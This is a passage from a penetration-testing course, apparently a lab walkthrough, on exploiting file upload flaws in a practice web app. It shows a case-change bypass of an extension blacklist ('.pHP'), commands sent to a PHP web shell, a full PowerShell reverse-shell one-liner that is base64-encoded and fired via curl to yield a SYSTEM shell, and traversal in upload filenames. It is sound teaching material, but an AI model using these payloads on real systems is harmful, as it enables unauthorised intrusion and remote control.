### 9.3.1 Using Executable Files

In this section, we will review a file upload vulnerability that enables the uploading of files to be executed by the web server. As with Directory Traversal and File Inclusion vulnerabilities, it is important to understand how to identify File Upload vulnerabilities.

Depending on the web application and its usage, we can make educated guesses to locate upload mechanisms. For example, if the web application is a Content Management System (CMS), we can often upload an avatar for our profile or create blog posts and web pages with attached files. If our target is a company website, we can often find upload mechanisms in career sections or company-specific use cases. For instance, if the target website belongs to a lawyer’s office, there may be an upload mechanism for case files. Sometimes, the file upload mechanisms are not obvious to users, so we should never skip the enumeration phase when working with a web application.

In this example, we will exploit a file upload mechanism to achieve code execution and obtain a reverse shell. Let’s review the “Mountain Desserts” web application on the MOUNTAIN VM. We’ll open Firefox and navigate to `http://192.168.50.189/meteor/`.

#### Figure 134: Updated “Mountain Desserts” Web Application

Figure 134 shows that in the new version of the “Mountain Desserts” app, the Admin link has been replaced by an upload form. The text explains that we can upload a picture to win a contest. The tab bar also shows an XAMPP icon, indicating that the web application is likely running the XAMPP stack. The text explains that the company wanted to switch to Windows, so we can assume that the web application is now running on a Windows system. Let’s find out if we can upload a text file instead of an image.

```bash
kali@kali:~$ echo "this is a test" > test.txt
```

**Listing 156 - Create a test text file**

Let’s upload the test file to the web application via the upload form in the browser.

#### Figure 135: Successful Upload of test.txt

Figure 135 shows that we successfully uploaded our text file, indicating that the upload mechanism is not limited to images only. Next, let’s attempt to upload the `simple-backdoor.php` web shell used in the previous Learning Unit.

#### Figure 136: Failed Upload of simple-backdoor.php

Figure 136 shows that the web application blocked our upload, stating that PHP files are not allowed and files with PHP file extensions are blacklisted. Since we don’t know exactly how the filter is implemented, we’ll use a trial-and-error approach to find ways to bypass it.

One method to bypass this filter is to change the file extension to a less-commonly used PHP file extension, such as `.phps` or `.php7`. This may allow us to bypass simple filters that only check for the most common file extensions, `.php` and `.phtml`. These alternative file extensions were mostly used for older versions of PHP or specific use cases but are still supported for compatibility in modern PHP versions.

Another way to bypass the filter is by changing characters in the file extension to uppercase. The blacklist may be implemented by comparing the file extension of the uploaded file to a list of strings containing only lowercase PHP file extensions. If so, we can update the uploaded file extension with uppercase characters to bypass the filter.

Let’s try the second method, updating our `simple-backdoor.php` file extension from `.php` to `.pHP`. After renaming the file either in the terminal or file explorer, we’ll upload it via the web form.

#### Figure 137: Successful Upload of simple-backdoor.pHP

This small change allowed us to bypass the filter and upload the file. Let’s confirm if we can use it to execute code as we did in the RFI section. The output shows that our file was uploaded to the “uploads” directory, so we can assume there is a directory named “uploads”.

Let’s use `curl` to provide `dir` as a command for the `cmd` parameter of our uploaded web shell.

```bash
kali@kali:~$ curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir
...
Directory of C:\xampp\htdocs\meteor\uploads
04/04/2022 06:23 AM  .
04/04/2022 06:23 AM  ..
04/04/2022 06:21 AM 328 simple-backdoor.pHP
04/04/2022 06:03 AM 15 test.txt
2 File(s) 343 bytes
2 Dir(s) 15,410,925,568 bytes free
...
```

**Listing 157 - Execution of dir command in the uploaded web shell**

Listing 157 shows us the output of the `dir` command, confirming that we can now execute commands on the target system. Although this bypass was quick and basic, these kinds of bypasses are often highly effective.

Let’s wrap up this section by obtaining a reverse shell from the target machine. We’ll start a Netcat listener in a new terminal to catch the incoming reverse shell on port 4444.

```bash
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
```

**Listing 158 - Starting Netcat listener on port 4444**

Let’s use a PowerShell one-liner for our reverse shell. Since there are several special characters in the reverse shell one-liner, we will encode the string with base64. We can use PowerShell or an online converter to perform the encoding.

In this demonstration, we’ll use PowerShell on our Kali machine to encode the reverse shell one-liner. First, let’s create the variable `$Text`, which will store the reverse shell one-liner as a string. Then, we can use the `Convert` method and the `Unicode` property from the `Encoding` class to encode the contents of the `$Text` variable.

```powershell
kali@kali:~$ pwsh
PowerShell 7.1.3
Copyright (c) Microsoft Corporation.
https://aka.ms/powershell
Type 'help' to get help.
PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
PS> $EncodedText =[Convert]::ToBase64String($Bytes)
PS> $EncodedText
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
...
AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
PS> exit
```

**Listing 159 - Encoding the one-liner in PowerShell on Linux**

As shown in Listing 159, the `$EncodedText` variable contains the encoded reverse shell one-liner. Let’s use `curl` to execute the encoded one-liner via the uploaded `simple-backdoor.pHP`. We can add the base64 encoded string for the `powershell` command using the `-enc` parameter. We’ll also need to use URL encoding for the spaces.

```bash
kali@kali:~$ curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0...AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```

**Listing 160 - Using curl to send the base64 encoded reverse shell one-liner**

After executing the command, we should receive an incoming reverse shell in the second terminal where Netcat is listening.

```bash
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.119.3] from (UNKNOWN) [192.168.50.189] 50603
ipconfig
Windows IP Configuration
Ethernet adapter Ethernet0 2:
Connection-specific DNS Suffix . :
IPv4 Address. . . . . . . . . . . : 192.168.50.189
Subnet Mask . . . . . . . . . . . : 255.255.255.0
Default Gateway . . . . . . . . . : 192.168.50.254
PS C:\xampp\htdocs\meteor\uploads> whoami
nt authority\system
```

**Listing 161 - Incoming reverse shell**

Listing 161 shows that we received a reverse shell through the base64 encoded reverse shell one-liner. Great!

In this section, we have demonstrated how to abuse a file upload mechanism in a PHP web application. We achieved code execution by uploading a web shell from our Kali system. If the target web application was using ASP instead of PHP, we could have used the same process to obtain code execution, uploading an ASP web shell. Fortunately, Kali already contains a broad variety of web shells covering the frameworks and languages we discussed, located in the `/usr/share/webshells/` directory.

```bash
kali@kali:~$ ls -la /usr/share/webshells
total 40
drwxr-xr-x 8 root root 4096 Feb 11 02:00 .
drwxr-xr-x 320 root root 12288 Apr 19 09:17 ..
drwxr-xr-x 2 root root 4096 Feb 11 01:58 asp
drwxr-xr-x 2 root root 4096 Apr 25 07:25 aspx
drwxr-xr-x 2 root root 4096 Feb 11 01:58 cfm
drwxr-xr-x 2 root root 4096 Apr 25 07:06 jsp
lrwxrwxrwx 1 root root 19 Feb 11 02:00 laudanum -> /usr/share/laudanum
drwxr-xr-x 2 root root 4096 Feb 11 01:58 perl
drwxr-xr-x 3 root root 4096 Feb 11 01:58 php
```

**Listing 162 - Listing of the webshells directory on Kali**

Listing 162 shows us the frameworks and languages for which Kali already offers web shells. It is important to understand that while the implementation of a web shell is dependent on the programming language, the basic process of using a web shell is nearly identical across these frameworks and languages. After identifying the framework or language of the target web application, we need to find a way to upload our web shell. The web shell needs to be placed in a location where we can access it. Next, we can provide commands to it, which are executed on the underlying system.

We should be aware that the file types of our web shells may be blacklisted via a filter or upload mechanism. In situations like this, we can try to bypass the filter as in this section. However, there are other options to consider. Web applications handling and managing files often enable users to rename or modify files. We could abuse this by uploading a file with an innocent file type like `.txt`, then changing the file back to the original file type of the web shell by renaming it.

### 9.3.2 Using Non-Executable Files

In this section, we’ll examine why flaws in file uploads can have severe consequences even if there is no way for an attacker to execute the uploaded files. We may encounter scenarios where we find an unrestricted file upload mechanism but cannot exploit it. One example is Google Drive, where we can upload any file but cannot leverage it to get system access. In such situations, we need to leverage another vulnerability, such as Directory Traversal, to abuse the file upload mechanism.

Let’s begin to explore the updated “Mountain Desserts” web application by navigating to `http://mountaindesserts.com:8000`.

#### Figure 138: Mountain Desserts Application on Windows

We’ll first notice that the new version of the web application still allows us to upload files. The text also reveals that this version of the application is running on Linux. Furthermore, there is no Admin link at the bottom of the page, and `index.php` is missing in the URL. Let’s use `curl` to confirm whether the `admin.php` and `index.php` files still exist.

```bash
kali@kali:~$ curl http://mountaindesserts.com:8000/index.php
404 page not found
kali@kali:~$ curl http://mountaindesserts.com:8000/meteor/index.php
404 page not found
kali@kali:~$ curl http://mountaindesserts.com:8000/admin.php
404 page not found
```

**Listing 163 - Failed attempts to access PHP files**

Listing 163 shows that the `index.php` and `admin.php` files no longer exist in the web application. We can safely assume that the web server is no longer using PHP. Let’s try to upload a text file. We’ll start Burp to capture the requests and use the form on the web application to upload the `test.txt` file from the previous section.

#### Figure 139: Text file successfully uploaded

Figure 139 shows that the file was successfully uploaded according to the web application’s output.

When testing a file upload form, we should always determine what happens when a file is uploaded twice. If the web application indicates that the file already exists, we can use this method to brute force the contents of a web server. Alternatively, if the web application displays an error message, this may provide valuable information such as the programming language or web technologies in use.

Let’s review the `test.txt` upload request in Burp. We’ll select the POST request in HTTP history, send it to Repeater, and click on Send.

#### Figure 140: POST request for the file upload of test.txt in Burp

Figure 140 shows we receive the same output as we did in the browser, without any new or valuable information. Next, let’s check if the web application allows us to specify a relative path in the filename and write a file via Directory Traversal outside of the web root. We can do this by modifying the `filename` parameter in the request so it contains `../../../../../../../test.txt`, then click send.

#### Figure 141: Relative path in filename to upload file outside of web root

The Response area shows us that the output includes the `../` sequences. Unfortunately, we have no way of knowing if the relative path was used for placing the file. It’s possible that the web application’s response merely echoed our filename and sanitized it internally. For now, let’s assume the relative path was used for placing the file, since we cannot find any other attack vector. If our assumption is correct, we can try to blindly overwrite files, which may lead us to system access. We should be aware that blindly overwriting files in a real-life penetration test could result in lost data or costly downtime of a production system. Before moving forward, let’s briefly review web server accounts and permissions.

Web applications using Apache, Nginx, or other dedicated web servers often run with specific users, such as `www-data` on Linux. Traditionally on Windows, the IIS web server runs as a Network Service account, a passwordless built-in Windows identity with low privileges. Starting with IIS version 7.5, Microsoft introduced the IIS Application Pool Identities. These are virtual accounts running web applications grouped by application pools. Each application pool has its own pool identity, making it possible to set more precise permissions for accounts running web applications.